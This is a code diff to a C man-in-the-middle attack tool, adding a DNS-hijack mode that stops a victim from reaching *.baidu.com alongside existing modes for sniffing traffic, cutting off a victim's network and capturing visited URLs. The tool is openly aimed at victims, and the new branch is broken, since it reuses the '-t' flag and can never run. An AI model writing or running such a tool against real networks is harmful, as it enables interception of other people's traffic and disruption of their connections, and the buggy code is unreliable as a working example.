@@ -7,11 +7,6 @@
 
 #include "head.h"
 
-/* modes */
-#define Sniff 1
-#define Break 2
-#define Get 3
-
 /* mode control */
 int mode;
 
@@ -43,12 +38,13 @@ int main(int argc, char const *argv[]) {
         printf("\t-b [time]: Break someone's network for [time(seconds)] long.\n\n");
         printf("\t-b: Break someone's network.\n\n");
         printf("\t-t: Get all webpage information your vitcim visited.\n\n");
+        printf("\t-d: Lanuch a DNS hijack, and forbid you victim visit *.baidu.com\n\n");
         printf("Attention: -t will not function when he visit webpage using HTTPS encryption.\n");
         exit(1);
     }
     else if (argv[1] != NULL && !strcmp(argv[1], "-s")) {
         mode = Sniff;
-        printf("MODE: Sniff!\n\n");
+        printf("MODE: SNIFF!\n\n");
     }
     else if (argv[1] != NULL && !strcmp(argv[1], "-b")) {
         mode = Break;
@@ -57,6 +53,10 @@ int main(int argc, char const *argv[]) {
     else if (argv[1] != NULL && !strcmp(argv[1], "-t")) {
         mode = Get;
         printf("MODE: GET!\n\n");
+    }
+    else if (argv[1] != NULL && !strcmp(argv[1], "-t")) {
+        mode = Dns;
+        printf("MODE: DNS HIJACK!\n\n");
     }
     else {
         printf("A small tool to launch a Man-in-the-middle attack, and HUA JI your victims.\n");
@@ -77,6 +77,7 @@ int main(int argc, char const *argv[]) {
     MITM_info MITM_arg;
     Getinfo(&MITM_arg);
     MITM_arg.dev = device;
+    MITM_arg.mode = mode;
     char filter_app[50] = "ip and ether dst ";
     char mymac[50];
     sprintf(mymac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", MITM_arg.ATTACKER_MAC[0], MITM_arg.ATTACKER_MAC[1],
@@ -104,7 +105,13 @@ int main(int argc, char const *argv[]) {
     }
 
     /* forward */
-    printf("Now his network is in your power!\n");
+    if (mode == Get) {
+        printf("Now his network is in your power!\n");
+        printf("Next are urls he visited!\n\n");
+    }
+    if (mode == Dns) {
+        printf("Now your victim can't visit *.baidu.com\n\n");
+    }
     ret_thread2 = pthread_create(&thread2, NULL, (void *)&forward_packet, (void *)&MITM_arg);
     ret_thread3 = pthread_create(&thread3, NULL, (void *)&forward_packet, (void *)&MITM_arg);
 
